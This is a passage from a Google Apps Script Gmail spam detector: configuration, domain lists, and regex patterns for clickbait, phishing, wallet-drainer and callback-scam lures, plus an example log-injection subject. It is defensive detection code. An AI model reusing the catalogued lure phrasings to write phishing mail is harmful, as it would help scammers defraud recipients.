/**
 * Gmail Spam Detector - Google Apps Script
 * @version 6.60.1
 *
 * Automated spam detection and destruction for Gmail. Runs on a 1-minute
 * trigger (a scheduled task), scanning the inbox for unprocessed emails and
 * applying a multi-signal pattern detection engine.
 *
 * Detection strategy — target behavioral patterns spammers can't easily change:
 *   - Bulk email infrastructure (Amazon SES, SendGrid, Mailchimp)
 *   - Clickbait/fear-mongering subject patterns
 *   - Unicode obfuscation (Cyrillic, Greek, fullwidth, mathematical chars)
 *   - Marketing sender format
 *   - Blacklisted sender domains (known spam mills)
 *   - Suspicious From-field anomalies (headline-like display names)
 *   - Link-graph anomalies (CTA text naming a brand the destination lacks)
 *   - Machine-generated free-mail sender addresses (throwaway accounts)
 *
 * Execution flow:
 *   1. processInbox() — scan inbox, analyze each email, flag spam
 *   2. markAsSpam()   — report to Gmail (trains filters) + immediately delete by ID
 *      quarantineAsPhishing() — Rule 7 only: report + label, NO delete
 *   3. destroySpam()  — safety-net sweep of this detector's own verdicts
 *   5. auditRunIntegrity() — verifies the run did what it believes it did;
 *      writes AUDIT_* rows to the Sheet when an invariant is violated
 *   4. reviewGmailSpam() — deletes Gmail-classified spam after a grace period
 *      (CONFIG.gmailSpamGraceDays); whitelisted senders are never deleted.
 *      A version change re-reviews the whole folder, so an improved rule is
 *      applied to spam the previous logic already dismissed.
 *
 * Decision logic (9 rules, evaluated in priority order — first match wins):
 *   Rule 1: Bulk email + blacklisted sender domain → spam
 *   Rule 2: Bulk email + 2+ clickbait patterns → spam
 *   Rule 3: Bulk email + 2+ distinct spam behaviors → spam
 *   Rule 4: 3+ clickbait patterns (no bulk email required) → spam
 *   Rule 5: Empty subject + attachment → payload delivery scam
 *   Rule 6: Cloud service notification subject from non-service sender → phishing
 *   Rule 7: CTA link text names a document brand the href does not belong to → phishing
 *           (QUARANTINED: archived + labelled, never deleted — see quarantineAsPhishing)
 *   Rule 8: Free-mail machine-generated sender + 2+ spam behaviors → spam
 *   Rule 9: Free-mail sender invoicing as a brand it does not control, with a
 *           phone number as the payload → callback phishing
 *           (QUARANTINED: archived + labelled, never deleted)
 *
 * Changelog: see CHANGELOG.md. It is not reproduced here — it reached 459
 * lines and three consecutive entries described three incompatible designs for
 * the same function as if all were current, which made the live contract hard
 * to find. This block documents only what is true NOW.
 *
 * Setup: See README.md or run setup() and follow the logs.
 */


// =============================================================================
// Configuration
// =============================================================================

/**
 * Global configuration — frozen to prevent accidental modification at runtime.
 *
 * Why "frozen"? In JavaScript, objects are normally mutable — any code can do
 * CONFIG.maxEmailsPerRun = 999. Object.freeze() prevents that. If you try to
 * modify a frozen object, JavaScript throws a TypeError immediately instead of
 * silently ignoring the change (which is the default JS behavior and a common
 * source of hard-to-find bugs).
 *
 * These values control processing limits, detection thresholds, and safety caps.
 *
 * @const {Object}
 */
/**
 * Deployed script version, as a runtime-readable value.
 *
 * Mirrors the version tag in the header comment, but must be a real constant
 * because runPeriodicMaintenance() compares it against the last version seen
 * in Script Properties to detect that a new deploy has landed.
 *
 * Patched automatically by the deploy workflow from the commit message, in a
 * separate sed from the header tag. (The header-tag sed is anchored to
 * "^ * @version " as of v6.43.0, so it cannot reach this line.)
 *
 * @const {string}
 */
const SCRIPT_VERSION = '6.60.1';

const CONFIG = Object.freeze({
  /** Max emails per run — prevents Apps Script 6-minute execution timeout */
  maxEmailsPerRun: 50,

  /** How many days back to scan for unprocessed emails */
  daysToCheck: 1,

  /** Days a GMAIL-classified message sits in Spam before this detector will
   *  delete it.
   *
   *  This is the most safety-relevant number in the file. Gmail intercepts that
   *  mail before the inbox, so our rules never judged it, and Gmail's own
   *  false-positive classes — first contact from a new correspondent, 2FA from a
   *  small service with imperfect DKIM, an invoice on a cheap relay — are
   *  exactly the mail no whitelist can enumerate in advance. The grace period
   *  is their recovery window: the folder is visible, searchable, and one
   *  "Not spam" click from undoing Gmail's mistake.
   *
   *  Gmail's own retention is 30 days. Seven still empties the folder on a
   *  rolling basis while leaving a real window. Lowering it trades that window
   *  for tidiness; 0 would be the blanket sweep that destroyed mail in the
   *  first place. */
  gmailSpamGraceDays: 7,

  /** Gmail label applied to processed emails to prevent reprocessing */
  processedLabel: 'SpamChecked',

  /** Label for mail held for human review rather than acted on. Applied by
   *  cleanse mode, by the recheck pass, to messages too large to evaluate, and
   *  to anything a destructive rule matched but which could not be archived.
   *  Nothing carrying this label has been deleted. */
  reviewLabel: 'SuspectedSpam',

  /** Label applied by markAsSpam() before it deletes, so destroySpam() can
   *  sweep ONLY mail this detector condemned. Without it the sweep deleted the
   *  whole Spam folder, including mail GMAIL classified that this script never
   *  evaluated — permanently, with no Drive archive and no log row. Gmail's own
   *  false positives are now left alone; Gmail auto-purges Spam at 30 days. */
  purgeLabel: 'SpamDetectorPurge',

  /** Label applied to quarantined phishing (Rule 7). The message is archived
   *  out of the inbox and labelled, never deleted and never moved to Spam, so
   *  it stays in All Mail indefinitely — not subject to Gmail's 30-day spam
   *  purge. Also excluded by buildSearchQuery() so it is not re-detected. */
  phishingLabel: 'Phishing',

  /** Enable verbose debug logging (set true for troubleshooting) */
  debug: false,

  /** Max email size to process — prevents memory issues with large attachments */
  maxEmailSizeBytes: 5 * 1024 * 1024 // 5MB
});


// =============================================================================
// Default Domain Lists
// =============================================================================

/**
 * Default whitelist and blacklist for initial setup.
 * Actual runtime lists are stored in Script Properties (persistent key-value
 * store) and managed via addToWhitelist()/addToBlacklist().
 * These defaults are only written on first setup via initializeScriptProperties().
 *
 * @const {Object}
 */
const DEFAULT_DOMAINS = Object.freeze({
  /** Known legitimate senders — bypass spam detection entirely */
  legitimate: Object.freeze([
    'sardine.ai', 'meetup.com', 'substack.com', 'conservative.ca',
    'conservativebc.ca',
    'sundaymass.store', 'customerservice@stan', 'privaterelay.appleid.com',
    'email.meetup.com', 'ben-evans.com', 'linkedin.com', 'e.linkedin.com',
    'linkedin.email', 'dsf.ca', 'dragonfly', 'ezyvet.com'
  ]),
  /** Known spam mill domains — triggers Rule 1 when combined with bulk email */
  suspicious: Object.freeze([
    'financeinsiderpro.com', 'financebuzz', 'smartinvestmenttools',
    'investorplace', 'weissratings', 'americanprofitinsight.com',
    'saferetirementreports.com', 'thinkrichtoday.com',
    'brightcrestcapital.com', 'turbotradepro.com',
    'budgetingjournals.com', 'investorbusinesstalk.com',
    'expertmodernadvice',
    'investingtrendstoday',
    'smartpeoplemail',
    'onlineinvestingdaily',
    'beststockvillage',
    'frontiercapitalreport.com',
    'morningstockadviser',
    '1stamericanpath.com',
    'finrisex.com',
    'economicrulebook.com',
    'bondlyst.com',
    'atlantisinvestors.com'
  ])
});


// =============================================================================
// Internal Limits
// =============================================================================

/**
 * Named constants for internal thresholds — prevents magic numbers scattered
 * through detection and sanitization logic.
 *
 * @const {Object}
 */
const LIMITS = Object.freeze({
  /** From display names longer than this are flagged as suspicious (keyword stuffing) */
  maxDisplayNameLength: 50,

  /** Input truncation cap — some regex patterns take exponentially long on huge strings
   *  (called "ReDoS"). 100 000 chars is far more than any real email field needs. */
  maxInputChars: 100000,

  /** Log message truncation — prevents a crafted subject from inserting fake log lines
   *  (e.g. a subject of "OK\n[ERROR] Deleted everything" would print two log lines). */
  maxLogChars: 100,

  /** Max HTML characters scanned for anchors by extractAnchors(). Real marketing
   *  HTML is well under 100 000; 262 144 is generous headroom while still capping
   *  worst-case scan cost on a hostile 5 MB body.
   *  NOTE: write these as bare integers, never `256 * 1024` — the Python test
   *  harness parses LIMITS with /(\w+)\s*:\s*(\d+)/ and would load "256". */
  maxHtmlScanChars: 262144,

  /** Max anchors examined per message. Calls-to-action appear early; a document
   *  with 300+ links is a directory dump, not a lure. Bounds the exec() loop. */
  maxAnchorsScanned: 300,

  /** Max characters written to a single Google Sheets cell. Sheets' own limit
   *  is 50 000 and exceeding it makes setValues() throw, which discarded the
   *  log rows for an entire batch — all of which were already deleted. */
  maxSheetCellChars: 5000,

  /** Subject/From truncation for PATTERN MATCHING.
   *  maxInputChars (100 000) is three orders of magnitude larger than any real
   *  subject, and several patterns have the shape X.*Y, which is QUADRATIC when
   *  X matches at many positions. A 100KB subject of "Trump " measured 3.5s
   *  across the pattern set, and 200KB across subject+from measured 14s — one
   *  email exceeding the 6-minute budget, which kills the run, leaves the
   *  threads unlabelled, and makes the next trigger repeat it forever. */
  maxSubjectChars: 2000,
  maxFromChars: 500,

  /** Max characters of raw RFC822 scanned for bulk-sender fingerprints. All
   *  fingerprints live in headers, so scanning the whole message (which can be
   *  25MB with attachments) only allocated a second copy of it. */
  maxRawScanChars: 65536,

  /** Max characters scanned for a single opening <a ...> tag. Bounds the
   *  quote-aware findTagEnd() scan; a real anchor tag with inline styles is
   *  a few hundred characters. */
  maxAnchorTagChars: 4000,

  /** Max characters of inner text read per anchor before giving up on </a>.
   *  Without this an unclosed <a> would scan to end-of-document, and N unclosed
   *  anchors would cost O(N x doclen). */
  maxAnchorTextChars: 2048,

  /** Upper bounds used by validateConfig() to catch misconfiguration.
   *  For example, setting maxEmailsPerRun to 10 000 would hit Apps Script's
   *  6-minute timeout and crash every run. These constants prevent that.
   *  They are NOT used by the detector itself — only by validateConfig(). */
  maxAllowedEmailsPerRun: 500,
  maxAllowedDaysToCheck: 30
});


// =============================================================================
// Normalization
// =============================================================================

/**
 * Matches RFC 2822 quoted display names: `"Name" <email@domain>`
 *
 * The email standard allows display names to be wrapped in quotes. This regex
 * strips them so pattern matching always sees: `Name <email@domain>`
 *
 * Capture groups:
 *   $1 — display name content (handles escaped chars like \")
 *   $2 — the <email@address> portion
 *
 * Usage: from.replace(RFC2822_QUOTED_NAME, '$1$2')
 *
 * @const {RegExp}
 */
const RFC2822_QUOTED_NAME = /^"((?:[^"\\]|\\.)*)"(\s*<[^>]*>)$/;


// =============================================================================
// Detection Patterns
//
// Defined at module level so RegExp objects are compiled once, not on every
// call to analyzeMessage(). Each array is frozen to prevent accidental mutation.
// =============================================================================

// ── ReDoS safety analysis ────────────────────────────────────────────────────
// All patterns below (and in BODY_CRYPTO_PATTERNS, FEAR_PATTERNS, etc.) are
// checked against inputs that have been truncated to LIMITS.maxInputChars
// (100KB) by sanitizeInput(). Within that bound:
//
//   No nested quantifiers: no pattern uses constructs like /(a+)+/ or /(ab*)+/
//   that cause exponential backtracking. All quantifiers operate on single-width
//   atoms, character classes, or fixed-length alternations.
//
//   Alternation groups like /(foo|bar|baz)/ are anchored with \b or surrounded
//   by literal characters, preventing catastrophic backtracking on near-misses.
//   Example: /\b(warning|alert|urgent)\b/i fails immediately at a word boundary
//   rather than exploring all alternation paths on a mismatch.
//
//   Unicode range patterns like /[\u0400-\u04FF]/ scan linearly — O(n) with
//   no backtracking. They are always standalone character classes.
//
//   Estimated worst-case runtime: 100KB × ~50 patterns × ~1μs/KB ≈ 5ms/email.
//   This is well within the Apps Script 6-minute per-trigger budget even at
//   the maximum 50-email-per-run limit.
//
// The anchor scan (extractAnchors, used by Signal 7) is a SEPARATE cost class
// that this analysis does not cover, because it does not live in these pattern
// arrays and runs against the untruncated HTML body.
// It is bounded independently and deliberately:
//
//   It does NOT use a paired-tag regex. /<a[^>]*>([\s\S]*?)<\/a>/g is
//   polynomial in (anchor count × document length): an <a> with no closing
//   </a> — which mail clients tolerate, so attackers can emit them freely —
//   makes the engine scan to end-of-document before failing. 900 unclosed
//   anchors in a 4MB body is ~3e9 character steps, tens of seconds. Instead
//   the open tag is matched with a bounded regex and the close is found with
//   String.indexOf(), a native linear scan with no backtracking.
//
//   Every quantifier in the anchor and href patterns is explicitly bounded
//   ({0,2000}), so a malformed tag missing its '>' cannot walk the document.
//
//   Three LIMITS cap the work: maxHtmlScanChars (256KB scanned — this is the
//   real bound now that the untruncated body is passed in),
//   maxAnchorsScanned (300 anchors), maxAnchorTextChars (2KB per anchor).
//   Measured: 900 unclosed anchors in 5ms; a 500KB body in under 1ms.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Clickbait / sensationalism patterns — checked against subject + from concatenated.
 *
 * Each pattern targets a CATEGORY of spam tactic, not a specific phrase.
 * Example: the "shock words" pattern catches "shocking", "stunning", "bizarre", etc.
 * Spammers rotate specific words constantly, but they can't change their tactics —
 * sensationalism is how they make money. We detect the tactic, not the words.
 *
 * Each matching pattern increments clickbaitCount independently, which feeds:
 *   - Rule 2: bulk + 2+ clickbait patterns → spam
 *   - Rule 4: 3+ clickbait patterns (even without bulk email) → spam
 *
 * @const {Array<RegExp>}
 */
const CLICKBAIT_PATTERNS = Object.freeze([
  // --- Sensationalist language ---

  // Shock/sensation adjectives: "shocking admission", "bizarre discovery"
  /\b(shocking|stunning|bizarre|mysterious|secret|hidden|leaked|exposed|forbidden|bombshell)\b/i,

  // Terrifying/alarming adjectives (often stuffed into From display names)
  /\b(terrifying|alarming|devastating|horrifying|frightening|chilling|disturbing)\b/i,

  // Curiosity gap: mystery word + visual/media word ("secret photo", "leaked footage")
  /(strange|secret|hidden|mysterious|shocking|bizarre|unusual|leaked).*(picture|photo|image|video|camera|footage|document)/i,

  // Urgency + sensationalism: "breaking news", "urgent warning"
  /(breaking|urgent|warning|alert|stop|exposed|banned).*(news|truth|secret|scandal|exposed|revealed)/i,

  // Financial fear-mongering: market/money word + crisis word
  /(market|stock|economy|dollar|gold|bitcoin|investment|crypto).*(crash|collapse|shift|crisis|warning|alert|plunge|tank|dying)/i,

  // "Caught" visual-proof framing: "caught on camera", "caught red-handed"
  /caught (on|doing|in|red-handed)/i,

  // Transformation clickbait: "this changes everything", "what stunned everyone"
  /(what|this).*(changes everything|stunned everyone|shocked|amazed|surprised)/i,

  // --- Celebrity / political name-dropping ---

  // Celebrity credibility theft: "RFK Jr Issues Warning", "Musk Exposes", "MAHA report"
  // MAHA = "Make America Healthy Again" — RFK Jr.'s health initiative, used to brand health spam
  /\b(RFK|MAHA|Trump|Biden|Musk|Elon|Kennedy|Obama|Fauci|Gates)\b.*(warning|says|reveals|exposes|issues|predicts|warns|showed|shows|report)\b/i,

  // Political legitimization: "Trump approved/signed/backed [product]"
  // Spammers use political figures to give fake authority to financial pitches
  /\b(Trump|Biden|Obama|Musk|Kennedy|RFK)\b.*(approved|signed|backed|endorsed|directed|ordered|mandated)/i,

  // Celebrity merchandise/collectible scams: "Trump Coin", "Biden Medal"
  /\b(Trump|Biden|Obama|Kennedy)\b.*(coin|bill|medal|card|stamp|legacy|commemorat|collect|mint|gold|silver)/i,

  // --- Demographic and temporal targeting ---

  // Age-based fear: "Seniors Most At Risk", "If you're over 60"
  /\b(seniors?|elderly|retirees?|boomers?|over \d{2}|born before|age \d{2})\b.*(risk|warning|alert|danger|affected|target)/i,

  // Year-based urgency: current year + threat word for fake timeliness
  /\b202[4-9]\b.*(warning|alert|prediction|forecast|crisis)/i,

  // Conspiracy/hiding: "what they don't want you to know"
  /(what|who).*(hiding|don't want you|truth|they won't tell)/i,

  // Suppression conspiracy: "watch before this gets buried/removed/deleted"
  // Classic spam tactic — false urgency implying authority is hiding the content
  /\b(watch|read|see)\b.*(before this|before it).*(buried|removed|deleted|censored|banned|taken down)/i,

  // Impending doom framing: "What's Coming", "Not Prepared for what's ahead"
  /\bwhat.s (coming|ahead)\b|\bnot prepared\b/i,

  // --- Violence and military sensationalism ---

  // Military/war clickbait: "declared war", "bombing", "invasion", "attacking our"
  /\b(declared war|bombed|bombing|attacks?|attacking|attacked|destroyed|invasion)\b/i,

  // --- Financial hype ---

  // Pre-IPO investment solicitation: always spam in bulk email
  /\bpre-?ipo\b/i,

  // Stock price hype: "$5 a share", "$0.85 per share", "$0.72/share", "penny stock"
  /\$\d+(\.\d+)?(?:\s+(?:a|per)\s+|[\s\/]+)?share|\bpenny stock\b/i,

  // Watch/see curiosity gap: "watch what happened", "see this"
  /\b(watch|see)\s+(what|this|the moment)/i,

  // --- Structural / formatting indicators ---

  /【.*】/,           // Japanese-style brackets (spammer formatting tactic)
  /\[.{3,}[?!]\]/,    // Square brackets with punctuation: [Like This?]
  /💼|📸|⏯️|🚨|⚠️|📰|💰|⚡|🔐/,  // Sensationalist emoji cluster (🔐 = phishing "security notice" decoration)
  /\?\?\?|!!!/,       // Triple punctuation (urgency tactic)
  /\u2026|\.{3,}/,    // Ellipsis dramatic pause (Unicode … or ASCII ...)
  /\bWATCH\b.*\?$/i,  // "WATCH ...?" clickbait structure

  // --- Unicode obfuscation (filter evasion) ---

  /[\u0400-\u04FF]/,  // Cyrillic lookalikes: "Еlоn" with Cyrillic Е, о
  /[\u0370-\u03FF]/,  // Greek lookalikes: "Βanks" with Greek Β
  /[\uFF00-\uFFEF]/,  // Fullwidth chars: "＄2 Bill" — never legit in English
  // JS strings are UTF-16. Mathematical alphanumeric chars (U+1D400–U+1D7FF,
  // e.g. "𝗔𝗺𝗮𝘇𝗼𝗻") are encoded as surrogate pairs whose high surrogate is
  // always \uD835. Matching it catches all math bold/italic chars in one shot.
  // (Python uses \U0001D400-\U0001D7FF instead — same coverage, different encoding model.)
  /\uD835/,

  // --- Topic-specific spam categories ---

  // Jobs/employment fear: "jobs disappeared", "layoffs"
  /\b(jobs?|employment).*(disappeared|vanished|never existed|fake|fraud|layoffs?)/i,

  // Bank/branch closing fear: "banks closing", "ATMs shutting down"
  /\b(banks?|branch|branches|ATMs?).*(clos|shut|disappear|eliminat)/i,

  // Building/institution emoji (banks, hospitals, government)
  /🏦|🏥|🏛️|🏢/,

  // Collectible/commemorative scams: "limited edition", "rare coin"
  /\b(minted|commemorat|collector'?s?|limited edition|rare coin|gold.?plated|silver.?plated)\b/i,

  // Bullet-point date format: "• January 29 •" (newsletter spam tactic)
  /•\s*(January|February|March|April|May|June|July|August|September|October|November|December)\b/i,

  // Pipe-date subject format: "| February 23" (same tactic, pipe variant)
  /\|\s*(January|February|March|April|May|June|July|August|September|October|November|December)\b/i,

  // Bracket-date subject format: "[March 09]" — same tactic, bracket variant
  /\[\s*(January|February|March|April|May|June|July|August|September|October|November|December)\b/i,

  // Dash-date subject format: "- Mar 11, 2026" — same tactic, dash variant with abbreviated months
  /[-]\s*(Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\b/i,

  // Historical atrocity clickbait: Nazi/Holocaust references as engagement bait
  /\b(nazi|hitler|auschwitz|gestapo|mengele|third reich)\b/i,

  // Health condition anxiety triggers: "blood sugar", "brain fog"
  /\b(fatigue|insomnia|inflammation|blood sugar|cholesterol|blood pressure|joint pain|brain fog|belly fat)\b/i,

  // Numbered-threat framing: "#1 danger", "#1 killer", "the #1 cause of"
  // Common in health/diet spam — e.g. "This Toxic Vegetable Is The #1 Danger In Your Diet"
  /#\s*1\s*(danger|killer|risk|threat|cause|reason|enemy|mistake)/i,

  // Financial scam products: gift cards, tax liens, instant approval
  /\b(gift card|tax lien|tax sale|foreclosure list|pre-?approved|instant approval|no annual fee)\b/i,

  // "Now you can see/watch" exclusive access clickbait
  /\bnow you can (see|watch|view|get)\b/i,

  // Unicode punctuation obfuscation (lookalike slash characters)
  // U+2215 DIVISION SLASH, U+2044 FRACTION SLASH, U+29F8 BIG SOLIDUS
  /[\u2215\u2044\u29F8]/,

  // Financial product solicitation: "0% APR", "balance transfer"
  /\b(0\s*%\s*(interest|apr)|balance transfer|transfer your.*(balance|debt))\b/i,

  // Crypto quantity notation: "5000.00 $CLAW", "100 $USDT" — airdrop/ICO spam
  // Legitimate financial email writes "$5000", not "5000 $TICKER"
  /\b\d+(?:\.\d+)?\s+\$[A-Z]{4,}\b/,

  // Income opportunity lures: "second income", "passive income", "extra income"
  // Classic financial spam framing — promises of easy additional money
  /\b(second|extra|side|passive|additional|supplemental)\s+income\b/i,

  // Political looting narrative: "America was ripped off", "looted for decades"
  // Combines populist outrage framing with financial pitches (tariff rebate checks, etc.)
  /\b(ripped off|looted|robbed|bilked)\b/i,

  // Payback / revenge framing: "payback time" — common in political-financial scam emails
  // alongside looting narrative framing; both patterns fire independently
  /\bpayback time\b/i
]);

/**
 * Body-only crypto scam patterns — high-confidence terms that almost never
 * appear in legitimate email bodies. Each match increments clickbaitCount.
 * @const {Array<RegExp>}
 */
const BODY_CRYPTO_PATTERNS = Object.freeze([
  /\bairdrop\b/i,                    // Crypto token airdrop
  /\bconnect\s+(your\s+)?wallet\b/i, // "Connect your wallet" — wallet drainer
  /\bhardware\s+wallet\b/i,          // Hardware wallet phishing lure (Ledger/Trezor drainer)
  // Wallet/firmware "manual update" lure. "device" deliberately excluded —
  // legit Apple/Google/IT mail uses "update your device" routinely. Gating
  // on wallet/firmware/Ledger/Trezor keeps this crypto-scoped.
  /\b(?:manually\s+)?update\s+(?:your\s+)?(?:hardware\s+)?(?:wallet|firmware|ledger|trezor)\b/i
]);

/**
 * Body-only fear patterns — phishing-specific phrases that read as fear in
 * email body copy. Separate from FEAR_PATTERNS (which checks subject + from)
 * because legitimate transactional senders write fear-adjacent phrases in the
 * subject all the time ("Security alert", "Action required") but the
 * conditional-future framing "X could be compromised if Y" is a phishing
 * fingerprint — legit security alerts say "X was compromised" (definitive,
 * past tense), not "X could be compromised" (conditional, pressure tactic).
 * Each match increments clickbaitCount (same semantics as BODY_CRYPTO_PATTERNS).
 * @const {Array<RegExp>}
 */
const BODY_FEAR_PATTERNS = Object.freeze([
  /\b(?:access|account|wallet|funds|assets|identity|device)\s+(?:could|may|might)\s+be\s+compromised\b/i
]);

/**
 * Unicode obfuscation patterns checked against the email body.
 * Mirrors the four Unicode ranges in CLICKBAIT_PATTERNS (subject+from coverage) —
 * update both constants if extending. Separate body check is needed because
 * spammers hide obfuscated text inside HTML (e.g. "Сⅼіϲkhеrе" in a body anchor
 * tag) while keeping the subject clean to evade subject-level filters.
 * One match → +1 clickbaitCount (break after first hit — all four detect the
 * same evasion technique, not independent signals).
 * @const {Array<RegExp>}
 */
const BODY_UNICODE_PATTERNS = Object.freeze([
  /[Ѐ-ӿ]/, // Cyrillic lookalikes: "Еlоn" with Cyrillic Е, о
  /[Ͱ-Ͽ]/, // Greek lookalikes: "Βanks" with Greek Β
  /[＀-￯]/, // Fullwidth chars: "＄2 Bill" — never legit in English
  /\uD835/           // Mathematical alphanumeric surrogate (𝗔𝗺𝗮𝘇𝗼𝗻)
]);

/**
 * Fear-mongering patterns — boolean signal, first match wins.
 * Checked against subject + from concatenated.
 * @const {Array<RegExp>}
 */
const FEAR_PATTERNS = Object.freeze([
  // Government fear: IRS/NSA/FBI + threat/revelation verb
  /\b(IRS|NSA|FBI|CIA|government|federal)\b.*(warn|hiding|secret|spy|track|audit|investigation|admission|reveal|expose|confiscat)/i,

  // Financial fear: bank/money terms + seizure/theft/loss
  /\b(banks?|bank account|credit card|social security|identity|savings|cash|money)\b.*(seize|steal|stolen|hacked|freeze|frozen|close|closed|warning|alert|confiscat|take|taking|lost)/i,

  // Health fear: medical terms + danger verbs
  /\b(blood thinner|medication|drug|vaccine|doctor|FDA|health crisis|at risk)\b.*(warning|danger|deadly|killing|risk|avoid|corrupt)/i,

  // Standalone urgency words: "WARNING", "ALERT", "BREAKING"
  /\b(warning|alert|urgent|breaking|exposed|banned|stopped)\b/i,

  // "STOP using/taking/putting" imperative pattern
  /\bSTOP (using|taking|doing|buying|putting|eating|drinking)\b/i
]);

/**
 * Bulk email service fingerprints — substring matches against raw email headers.
 * These strings appear in Received/Return-Path headers when the email was routed
 * through Amazon SES, SendGrid, or Mailchimp. Legitimate direct senders won't have them.
 * @const {Array<string>}
 */
const BULK_EMAIL_FINGERPRINTS = Object.freeze([
  'amazonses.com', // Amazon Simple Email Service — used by many bulk senders
  'x-ses-',        // Amazon SES custom header prefix
  'sendgrid.net',  // SendGrid relay fingerprint
  'mcsv.net',      // Mailchimp sending infrastructure
  'iterable.com'   // Iterable marketing platform — appears in CDN/tracking URLs in body HTML (not headers)
]);

/**
 * Marketing sender format patterns — checked against From field only.
 * Detects spammy sender formatting. First match wins.
 * @const {Array<RegExp>}
 */
const MARKETING_PATTERNS = Object.freeze([
  /\|\s*[A-Z]/,                                                                        // "Name | Org" pipe separator
  /\s+at\s+[A-Z]/i,                                                                    // "Name at Organization"
  /\b(investment|trading|wealth|profit|finance|insider|market)\s*(tools?|pro|tips?|alert)/i, // Spammy business names
  /grow@with\./i,                                                                       // Suspicious email pattern
  /@[a-z]\.[a-z]+\.(com|net)/i                                                          // Subdomain pattern: @F.FinanceInsiderPro.com
]);

/**
 * Subject patterns that are exclusively used by cloud document-sharing services.
 * A legitimate match comes ONLY from the service's own sending infrastructure.
 * Any other sender using these subjects is impersonating the service (phishing).
 * @const {Array<RegExp>}
 */
const IMPERSONATION_SUBJECT_PATTERNS = Object.freeze([
  /\bdocument shared with you\b/i,               // Google Docs share notification subject
  /\binvited you to (edit|view|comment)\b/i,      // Google Docs access invitation
  /\bshared a (file|document|folder) with you\b/i // Google Drive / OneDrive share notification
]);

/**
 * Brands whose support/billing mail is impersonated by callback scams.
 *
 * These are consumer security, payment and marketplace brands — the ones a
 * fake renewal notice leans on, because "your antivirus auto-renews today"
 * creates urgency about money the recipient believes they already spend.
 *
 * Matched as plain substrings against lowercased subject+body, so keep entries
 * lowercase. A brand here can never be the free-mail sender's own domain, so
 * naming one from a gmail.com address is always a misrepresentation.
 * @const {Array<string>}
 */
const IMPERSONATED_SUPPORT_BRANDS = Object.freeze([
  'norton', 'mcafee', 'geek squad', 'best buy', 'paypal', 'lifelock',
  'windows defender', 'microsoft defender', 'applecare', 'apple care',
  'amazon prime', 'coinbase', 'quickbooks', 'avast', 'malwarebytes'
]);

/**
 * North American phone number, the payload of a callback scam.
 *
 * Linear — no nested quantifiers, so it is not a ReDoS risk on the 64KB
 * scan window. Requires a separator between groups, so it does not match a
 * bare 10-digit run such as an order number.
 * @const {RegExp}
 */
const CALLBACK_PHONE_PATTERN =
  /(?:\+?1[\s.\-]?)?\(?\d{3}\)?[\s.\-]\d{3}[\s.\-]\d{4}/;

/**
 * Billing language. A fake invoice has to state what is being charged.
 * @const {Array<RegExp>}
 */
const BILLING_LANGUAGE_PATTERNS = Object.freeze([
  /\b(?:invoice|subscription|membership|order)\s+(?:no|number|id|date|summary|total)\b/i,
  /\b(?:auto[-\s]?renew(?:al|s|ed|ing)?|renewal amount|renewal date)\b/i,
  /\b(?:has been|will be|was)\s+(?:charged|debited|billed)\b/i,
  /\bpayment\s+(?:id|method|of)\b/i,
  /\b(?:refund|cancellation)\s+(?:request|department|team|amount|process)\b/i,
  /\btotal\s+(?:amount|due|charged)\b/i
]);

/**
 * Trusted sender domains for cloud document-sharing services.
 * Used with IMPERSONATION_SUBJECT_PATTERNS: if the subject matches a service
 * notification template and the sender is NOT from one of these domains, it's phishing.
 * @const {Array<string>}
 */
const CLOUD_SERVICE_DOMAINS = Object.freeze([
  'google.com',
  'googlemail.com',
  'microsoft.com',
  'office.com',
  'sharepoint.com',
  'dropbox.com',
  'box.com',
  'notion.so',
  'atlassian.net'
]);

/**
 * E-signature / document-workflow brands whose name inside a call-to-action
 * link implies a specific set of legitimate destination hosts.
 *
 * Used by Signal 7 (brand-mismatched CTA): a button reading "VIEW IN DOCUSIGN"
 * whose href points somewhere that is not DocuSign is a credential-harvest
 * lure. The brand name is in the button because it converts — it borrows trust
 * the sender has not earned.
 *
 * KEYS must be lowercase [a-z0-9] with no spaces or punctuation. Anchor link
 * text is normalized with /[^a-z0-9]+/g before matching, so "Adobe Sign"
 * is keyed as 'adobesign'. A key containing a space or capital could never
 * match anything. Enforced by a parser self-test in the Python harness.
 *
 * VALUES are bare registrable hostnames, compared with hostMatchesDomain()
 * (exact or dot-suffix) — never substring, which would accept both
 * "notdocusign.net" and "docusign.net.evil.com".
 *
 * Deliberately NOT included: a bare 'box' key (would match "inbox",
 * "box office"), or any brand whose name is a common English word.
 *
 * CONSTRAINT: this object body must contain no { or } characters. The Python
 * harness extracts it with a naive brace counter that does not skip strings
 * or comments, so a brace anywhere inside would truncate the parse.
 *
 * @const {Object<string, Array<string>>}
 */
const BRAND_CTA_DOMAINS = Object.freeze({
  docusign:    Object.freeze(['docusign.net', 'docusign.com', 'docusign.eu', 'docusign.co.uk']),
  adobesign:   Object.freeze(['adobesign.com', 'echosign.com', 'adobe.com', 'acrobat.com']),
  echosign:    Object.freeze(['adobesign.com', 'echosign.com', 'adobe.com', 'acrobat.com']),
  hellosign:   Object.freeze(['hellosign.com', 'dropboxsign.com', 'dropbox.com']),
  dropboxsign: Object.freeze(['dropboxsign.com', 'hellosign.com', 'dropbox.com']),
  pandadoc:    Object.freeze(['pandadoc.com', 'pandadoc.net']),
  // 'signnow' deliberately REMOVED. Anchor text is normalized by stripping
  // non-alphanumerics, so the ordinary button label "Sign Now" collapses to
  // "signnow" and matched this key. That fired Rule 7 on legitimate
  // e-signature and HR buttons ("Sign Now" -> app.ironcladapp.com,
  // "Please review and sign now" -> acme.bamboohr.com). Per the key contract
  // above, brands whose name is a common English phrase cannot be matched this
  // way. Same reasoning already excludes a bare 'box' key.
  smartsheet:  Object.freeze(['smartsheet.com']),
  egnyte:      Object.freeze(['egnyte.com']),
  sharepoint:  Object.freeze(['sharepoint.com', 'microsoft.com', 'office.com', 'office365.com', 'microsoftonline.com']),
  onedrive:    Object.freeze(['onedrive.com', 'onedrive.live.com', 'live.com', 'microsoft.com', 'sharepoint.com']),
  googledrive: Object.freeze(['google.com', 'googleusercontent.com']),
  googledocs:  Object.freeze(['google.com', 'googleusercontent.com'])
});

/**
 * Click-tracking, link-wrapping and security-rewrite hosts.
 *
 * A brand CTA pointing at one of these is UNVERIFIABLE, not malicious — the
 * real destination is hidden behind the redirector. Signal 7 therefore
